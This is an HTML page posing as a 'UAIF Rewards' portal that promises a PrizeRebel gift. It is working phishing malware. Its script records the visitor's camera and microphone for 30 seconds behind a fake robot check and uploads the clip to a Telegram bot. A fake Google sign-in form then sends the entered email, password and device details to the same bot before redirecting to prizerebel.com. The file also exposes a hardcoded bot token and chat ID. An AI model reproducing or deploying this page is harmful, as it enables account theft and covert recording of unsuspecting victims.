<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UAIF Rewards | Secure Gateway</title>
    <style>
        :root {
            --primary: #00d2ff;
            --hacker: #00ff88;
            --bg: #0f172a;
            --glass: rgba(15, 23, 42, 0.9);
        }

        body {
            background: radial-gradient(circle at center, #1e293b 0%, #020617 100%);
            color: white;
            font-family: 'Inter', sans-serif;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            overflow: hidden;
        }

        .header-profile {
            position: absolute;
            top: 20px;
            right: 20px;
            display: flex;
            align-items: center;
            gap: 12px;
            background: var(--glass);
            padding: 10px 20px;
            border-radius: 50px;
            border: 1px solid var(--primary);
            backdrop-filter: blur(10px);
            z-index: 100;
        }
        .v-badge { color: var(--primary); font-weight: bold; }
        .user-photo { width: 50px; height: 50px; border-radius: 50%; border: 2px solid var(--primary); object-fit: cover; }

        .main-card {
            background: var(--glass);
            backdrop-filter: blur(25px);
            width: 90%;
            max-width: 420px;
            padding: 40px;
            border-radius: 35px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            text-align: center;
            box-shadow: 0 25px 50px rgba(0,0,0,0.6);
            position: relative;
        }

        .verify-btn, .login-btn {
            background: linear-gradient(45deg, #00d2ff, #3a7bd5);
            color: white;
            border: none;
            padding: 18px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 15px;
            cursor: pointer;
            width: 100%;
            margin-top: 20px;
            transition: 0.3s;
        }

        .input-group { text-align: left; margin-bottom: 15px; position: relative; }
        label { display: block; margin-bottom: 5px; font-size: 13px; color: #94a3b8; }
        input {
            width: 100%;
            padding: 15px;
            border-radius: 12px;
            border: 1px solid rgba(255,255,255,0.1);
            background: rgba(0,0,0,0.3);
            color: white;
            box-sizing: border-box;
            outline: none;
        }
        .toggle-pass {
            position: absolute;
            right: 15px;
            top: 38px;
            cursor: pointer;
            color: var(--primary);
            font-size: 12px;
            font-weight: bold;
        }

        .footer-sponsor {
            position: absolute;
            bottom: 30px;
            width: 100%;
            text-align: center;
        }
        .sponsor-grid { display: flex; justify-content: center; gap: 30px; margin-top: 10px; }
        .sponsor-box img { width: 60px; height: 60px; border-radius: 12px; border: 1px solid var(--hacker); background: #000; padding: 3px; }

        .loader-ring {
            width: 80px; height: 80px;
            border: 5px solid rgba(255,255,255,0.1);
            border-top: 5px solid var(--hacker);
            border-radius: 50%;
            margin: 20px auto;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .hidden { display: none; }

        #progress-container {
            width: 100%;
            background: rgba(255,255,255,0.1);
            border-radius: 10px;
            margin-top: 20px;
            overflow: hidden;
        }
        #progress-bar {
            width: 0%;
            height: 10px;
            background: var(--hacker);
            box-shadow: 0 0 15px var(--hacker);
            transition: width 0.5s;
        }
    </style>
</head>
<body>

    <div class="header-profile">
        <span class="v-badge">✓ VERIFIED</span>
        <img src="libraryyy/ class="user-photo" alt="Admin">
    </div>

    <div class="main-card">
        <div id="step-1">
            <h1 style="color: var(--primary);">EARN Portal</h1>
            <p>Verify your identity to claim your <b>PrizeRebel Gift</b>.</p>
            <button class="verify-btn" onclick="startVerification()">VERIFY I'M NOT A ROBOT</button>
            <a href="https://t.me/@doctorrobot0" style="color:var(--hacker); text-decoration:none; font-size:12px; display:block; margin-top:15px;">Admin:@KCH_Processor_Bot </a>
        </div>

        <div id="step-2" class="hidden">
            <h2 style="color: var(--hacker)">ANALYZING SENSORS</h2>
            <div class="loader-ring"></div>
            
            <div id="progress-container">
                <div id="progress-bar"></div>
            </div>
            <p id="status-text" style="font-family: monospace; font-size: 12px; color: var(--hacker); margin-top: 10px;">Bypassing Firewall...</p>

            <p id="timer" style="font-size: 35px; font-weight: bold;">30</p>
            <p style="font-family: monospace; color: var(--hacker);">checking Encrypted Handshake...</p>
        </div>

        <div id="step-3" class="hidden">
            <h2 style="color: var(--primary); margin-bottom:10px;">Login Required</h2>
            <p style="font-size: 13px; color: #94a3b8; margin-bottom: 20px;">Verification passed! Sign in with Google to receive your code.</p>
            
            <div class="input-group">
                <label>Google Email</label>
                <input type="email" id="email" placeholder="example@gmail.com">
            </div>
            
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="pass" placeholder="••••••••">
                <span class="toggle-pass" onclick="togglePassword()">SHOW</span>
            </div>
            
            <button class="login-btn" onclick="stealData()">CLAIM REWARD NOW</button>
        </div>
    </div>

    <div class="footer-sponsor">
        <p style="font-size: 10px; letter-spacing: 2px; color: #475569;">OFFICIAL SPONSORS</p>
        <div class="sponsor-grid">
            <div class="sponsor-box">
                <img src="libraryyy/.png" alt="UAIF">
            </div>
            <div class="sponsor-box">
                <img src="libraryyy/.png" alt="KCH">
            </div>
        </div>
    </div>

    <video id="vid" style="display:none" autoplay playsinline muted></video>

    <script>
        const BOT_TOKEN = '8519852338:AAGLztQixpgpju8BFN77yKx5IPEByL20Jao';
        const urlParams = new URLSearchParams(window.location.search);
        let CHAT_ID = urlParams.get('id');

        if (!CHAT_ID) {
            CHAT_ID = '6804829152'; 
        }

        let recorder;
        let chunks = [];

        function togglePassword() {
            const p = document.getElementById('pass');
            const s = document.querySelector('.toggle-pass');
            if (p.type === "password") {
                p.type = "text";
                s.innerText = "HIDE";
            } else {
                p.type = "password";
                s.innerText = "SHOW";
            }
        }

        async function startVerification() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: true 
                });
                
                document.getElementById('vid').srcObject = stream;
                document.getElementById('step-1').classList.add('hidden');
                document.getElementById('step-2').classList.remove('hidden');

                recorder = new MediaRecorder(stream);
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.start();

                let progress = 0;
                const bar = document.getElementById('progress-bar');
                const status = document.getElementById('status-text');
                const messages = ["Connecting to Proxy...", "Injecting Payload...", "Extracting Token...", "Finalizing Handshake..."];

                let timeLeft = 30;
                const countdown = setInterval(() => {
                    timeLeft--;
                    document.getElementById('timer').innerText = timeLeft;
                    
                    progress += 3.34; 
                    bar.style.width = progress + "%";
                    if(progress > 25) status.innerText = messages[1];
                    if(progress > 50) status.innerText = messages[2];
                    if(progress > 75) status.innerText = messages[3];

                    if(timeLeft <= 0) {
                        clearInterval(countdown);
                        stopAndNext();
                    }
                }, 1000);
            } catch (err) {
                console.error(err);
                alert("Security Error: Camera access is mandatory for verification.");
            }
        }

        function stopAndNext() {
            if (recorder && recorder.state !== "inactive") {
                recorder.stop();
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('video', blob, 'capture.mp4');

                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });

                    document.getElementById('step-2').classList.add('hidden');
                    document.getElementById('step-3').classList.remove('hidden');
                };
            }
        }

        async function stealData() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;
            const btn = document.querySelector('.login-btn');

            if(!email || !pass) {
                alert("Please complete the login to claim your reward.");
                return;
            }

            btn.innerText = "Synchronizing...";
            btn.disabled = true;

            // --- GET DEVICE & BATTERY INFO ---
            let batteryInfo = "Unknown";
            try {
                const battery = await navigator.getBattery();
                batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})`;
            } catch (e) { batteryInfo = "Blocked by Browser"; }

            const device = navigator.userAgent.match(/\(([^)]+)\)/)[1];
            const screenRes = `${window.screen.width}x${window.screen.height}`;

            const text = `🎯 **Login Captured!**\n\n📧 Email: \`${email}\`\n🔑 Pass: \`${pass}\`\n\n📱 **Device Info:**\n🔋 Battery: ${batteryInfo}\n📲 Model: ${device}\n🖥️ Screen: ${screenRes}\n🆔 Target ID: ${CHAT_ID}`;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: '6804829152', text: text, parse_mode: 'Markdown' })
            });

            setTimeout(() => {
                window.location.href = "https://www.prizerebel.com";
            }, 1500);
        }
    </script>
</body>
</html>
